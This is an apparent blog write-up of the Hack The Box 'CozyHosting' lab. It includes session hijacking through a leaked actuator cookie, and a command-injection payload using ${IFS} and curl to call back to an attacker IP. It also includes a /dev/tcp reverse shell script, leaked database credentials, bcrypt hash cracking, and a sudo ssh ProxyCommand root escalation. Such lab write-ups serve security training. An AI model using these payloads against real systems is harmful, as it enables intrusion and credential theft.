running <code>dirsearch -u http://cozyhosting.htb/&quot;</code> we found an endpoint<br><a href="http://cozyhosting.htb/actuator">http://cozyhosting.htb/actuator</a></p><p>The endpoint revealed some good info<br><a href="http://localhost:8080/actuator/sessions">http://localhost:8080/actuator/sessions</a><br><a href="http://localhost:8080/actuator/beans">http://localhost:8080/actuator/beans</a><br><a href="http://localhost:8080/actuator/health">http://localhost:8080/actuator/health</a><br><a href="http://localhost:8080/actuator/health/%7B*path%7D">http://localhost:8080/actuator/health/{*path}</a><br><a href="http://localhost:8080/actuator/env">http://localhost:8080/actuator/env</a><br><a href="http://localhost:8080/actuator/env/%7BtoMatch%7D">http://localhost:8080/actuator/env/{toMatch}</a><br><a href="http://localhost:8080/actuator/mappings">http://localhost:8080/actuator/mappings</a></p><h1 id="Endoint-actuator-sessions"><a href="#Endoint-actuator-sessions" class="headerlink" title="#Endoint &#x2F;actuator&#x2F;sessions"></a>#Endoint &#x2F;actuator&#x2F;sessions</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;DAD1A0B9921669A3828FC1BE56330CBD&quot;:&quot;kanderson&quot;&#125;</span><br></pre></td></tr></table></figure><p>The <code>DAD1A0B9921669A3828FC1BE56330CBD</code> is the cookie for kanderson so we can change our cookie and hijack the session. After we change the cookie we can go to the &#x2F;admin panel (we can find it from the &#x2F;actuator&#x2F;mappings endpoint)</p><p><img src="/images/CozyHosting/Ch(cookie).png" alt="Cookie"></p><h1 id="Admin-Dashboard"><a href="#Admin-Dashboard" class="headerlink" title="#Admin Dashboard"></a>#Admin Dashboard</h1><p><img src="/images/CozyHosting/Ch(Adm_Pan).png" alt="Adm_Panel"></p><p>At the bottom of the page we see a form that require’s a hostname and username for<br>automatic patching. We try to submit hostname as <code>127.0.0.1</code> and username as <code>test</code> but we get an error “Host key verification failed.”</p><p><img src="/images/CozyHosting/Ch(Form).png" alt="Form"></p><p>Probably this means that a service attempts to use ssh to connect to the hostname and username we provide above. As we don’t need to provide any passwords it uses a id_rsa so the command that the service runs is “ssh -i id_rsa username@hostname”</p><p>After some testing I found out that the username does not allow spaces but we can use ${IFS} to bypass that. A simple way to see if the command injection works it to curl a python server that we will host</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure><p>Then we will try to curl our python server and see if we get a callback<br><code>test;curl$&#123;IFS&#125;http://10.10.14.15:8888;</code></p><p><img src="/images/CozyHosting/Ch(Form_Curl).png" alt="Curl Form"><br><img src="/images/CozyHosting/Ch(Callback).png" alt="Call_Back"></p><p>Now we can generate a shell and upload it to the machine</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash\nsh -i &gt;&amp; /dev/tcp/10.10.14.15/1234 0&gt;&amp;1&#x27; &gt; rev.sh</span><br></pre></td></tr></table></figure><p>after creating the rev.sh and our python server is running we start out netcat listener</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure><p><img src="/images/CozyHosting/Ch(Form_Shell).png" alt="Curl_Shell"></p><p>And we execute a curl command pointing to the rev.sh we created<br>We got a shell, we can upgrade our shell with running</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/CozyHosting/Ch(Shell_App).png" alt="Shell_APP"></p><h1 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="#Lateral Movement"></a>#Lateral Movement</h1><p>We extract the .jar to tmp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -d /tmp/app cloudhosting-0.0.1.jar</span><br></pre></td></tr></table></figure><p>Inside there after some searching around we can find a application.properties that reveals credentials for a postgresql database.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server.address=127.0.0.1</span><br><span class="line">server.servlet.session.timeout=5m</span><br><span class="line">management.endpoints.web.exposure.include=health,beans,env,sessions,mappings</span><br><span class="line">management.endpoint.sessions.enabled = true</span><br><span class="line">spring.datasource.driver-class-name=org.postgresql.Driver</span><br><span class="line">spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect</span><br><span class="line">spring.jpa.hibernate.ddl-auto=none</span><br><span class="line">spring.jpa.database=POSTGRESQL</span><br><span class="line">spring.datasource.platform=postgres</span><br><span class="line">spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting</span><br><span class="line">spring.datasource.username=postgres</span><br><span class="line">spring.datasource.password=Vg&amp;nvzAQ7XxR</span><br></pre></td></tr></table></figure><p>We can see that a postgresql is running on 5432 and we have creds <code>postgres:Vg&amp;nvzAQ7XxR</code>. Using the command <code>psql -h 127.0.0.1 -U postgres</code> to log in we use <code>\list</code> to list all of the database and we see a <code>cozyhosting</code> that looks interesting so we connect to it</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\connect cozyhosting</span><br></pre></td></tr></table></figure><p>There are 2 tables one with users and one with hosts we use a simple command to dump the users table.</p><p><img src="/images/CozyHosting/Ch(Tables).png" alt="Tables"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure><p>The admin hash is <code>$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm</code></p><h1 id="Cracking-The-hash"><a href="#Cracking-The-hash" class="headerlink" title="#Cracking The hash"></a>#Cracking The hash</h1><p>To identify the hash we use <code>hashid $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm</code> or <code>hash-identifier</code> the hash it a bcrypt so after looking for the correct hashcat mode<br>we save the hash into a file and use hashcat with mode <code>3200</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash -m 3200 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/images/CozyHosting/Ch(Hashcat).png" alt="Hashcat"><br>The hash cracked to <code>manchesterunited</code> and in the home directory we have seen a user <code>josh</code> so we will try to ssh with josh and <code>manchesterunited</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh josh@10.10.11.230</span><br></pre></td></tr></table></figure><p>the flag is on <code>/home/josh/user.txt</code></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="#Privilege Escalation"></a>#Privilege Escalation</h1><p>We run <code>sudo -l</code> and provided the <code>manchesterunited</code> as password and we see that we can execute the <code>/usr/bin/ssh</code> with sudo.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User josh may run the following commands on localhost:</span><br><span class="line">    (root) /usr/bin/ssh *</span><br><span class="line">with root priv </span><br></pre></td></tr></table></figure><p>After a quick search on gtfo bins <a href="https://gtfobins.github.io/gtfobins/ssh/">https://gtfobins.github.io/gtfobins/ssh/</a> we found that we can run:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -o ProxyCommand=&#x27;;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; x</span><br></pre></td></tr></table></figure><p>and get a root shell, the flag is on <code>/root/root.txt</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
